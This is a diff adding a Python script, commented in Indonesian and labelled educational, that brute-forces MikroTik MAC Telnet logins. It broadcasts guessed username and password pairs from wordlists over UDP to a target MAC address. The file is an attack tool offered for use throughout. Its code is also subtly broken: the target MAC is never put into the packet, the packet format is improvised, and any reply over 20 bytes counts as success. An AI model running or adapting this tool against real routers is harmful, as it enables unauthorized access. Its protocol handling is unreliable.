@@ -1,0 +1,124 @@
+#!/usr/bin/env python3
+
+import socket
+import struct
+import sys
+import time
+import binascii
+
+# Pesan header untuk ditampilkan saat tool dijalankan
+BANNER = """
+===========================================================
+|         Winbox MAC Telnet Brute Force Tool              |
+|              Dibuat untuk Tujuan Edukasi                |
+|           https://github.com/thxferdz                   |
+===========================================================
+"""
+
+def create_mactelnet_packet(username, password):
+    """
+    Membuat paket MAC Telnet sesuai dengan format protokol MikroTik.
+    Ini adalah versi sederhana dari paket login.
+    """
+    header = b'\x00\x00\x00\x01\x00\x00\x00\x07\x00\x01\x00\x08\x00'
+    user_bytes = username.encode('utf-8')
+    pass_bytes = password.encode('utf-8')
+    user_field = struct.pack('!B', len(user_bytes)) + user_bytes
+    pass_field = struct.pack('!B', len(pass_bytes)) + pass_bytes
+    packet = header + user_field + pass_field
+    return packet
+
+def attempt_login(target_mac, username, password, delay):
+    """
+    Mencoba untuk login ke target MAC dengan username dan password yang diberikan.
+    """
+    try:
+        mac_bytes = binascii.unhexlify(target_mac.replace(':', ''))
+        if len(mac_bytes) != 6:
+            raise ValueError
+    except (ValueError, binascii.Error):
+        print(f"\n[!] Format MAC Address tidak valid: {target_mac}")
+        return False
+
+    packet = create_mactelnet_packet(username, password)
+    
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        s.settimeout(2.0)
+        mndp_port = 20561
+        s.sendto(packet, ('255.255.255.255', mndp_port))
+        data, addr = s.recvfrom(1024)
+        if data and len(data) > 20: 
+            return True
+    except socket.timeout:
+        pass
+    except PermissionError:
+        print("\n[!] Gagal membuat socket. Coba jalankan skrip ini dengan hak akses root/administrator.")
+        sys.exit(1)
+    except Exception as e:
+        pass
+    finally:
+        if 's' in locals():
+            s.close()
+        time.sleep(delay)
+        
+    return False
+
+def main():
+    """
+    Fungsi utama untuk menjalankan tool.
+    """
+    print(BANNER)
+    
+    # Meminta input dari pengguna secara langsung
+    try:
+        target_mac = input("[>] Masukkan MAC Address Target (cth: 00:0C:42:12:34:56): ")
+        userlist_file = input("[>] Masukkan nama file Userlist (cth: users.txt): ")
+        wordlist_file = input("[>] Masukkan nama file Wordlist (cth: pass.txt): ")
+        delay = float(input("[>] Masukkan jeda antar percobaan/delay (detik, cth: 0.2): "))
+        print("-" * 50)
+    except ValueError:
+        print("\n[!] Input jeda tidak valid. Harus berupa angka.")
+        sys.exit(1)
+        
+    # Membaca file userlist dan wordlist
+    try:
+        with open(userlist_file, 'r') as f:
+            usernames = [line.strip() for line in f.readlines()]
+        with open(wordlist_file, 'r', errors='ignore') as f:
+            passwords = [line.strip() for line in f.readlines()]
+    except FileNotFoundError as e:
+        print(f"\n[!] Error: File tidak ditemukan -> {e.filename}")
+        sys.exit(1)
+
+    print(f"[*] Target MAC: {target_mac}")
+    print(f"[*] Memuat {len(usernames)} username dari {userlist_file}")
+    print(f"[*] Memuat {len(passwords)} password dari {wordlist_file}")
+    print(f"[*] Memulai serangan brute force...\n")
+    
+    # Memulai loop brute force
+    found = False
+    try:
+        for user in usernames:
+            for password in passwords:
+                sys.stdout.write(f"\r[?] Mencoba -> User: {user}, Pass: {password.ljust(20)}")
+                sys.stdout.flush()
+
+                if attempt_login(target_mac, user, password, delay):
+                    print(f"\n\n[+] SUKSES! Kredensial ditemukan!")
+                    print(f"    -> Username: {user}")
+                    print(f"    -> Password: {password}\n")
+                    found = True
+                    break
+            if found:
+                break
+    except KeyboardInterrupt:
+        print("\n\n[!] Proses dihentikan oleh pengguna.")
+        sys.exit(0)
+
+    if not found:
+        print("\n\n[-] GAGAL. Tidak ada kredensial yang cocok ditemukan dari daftar yang diberikan.")
+
+if __name__ == "__main__":
+    main()
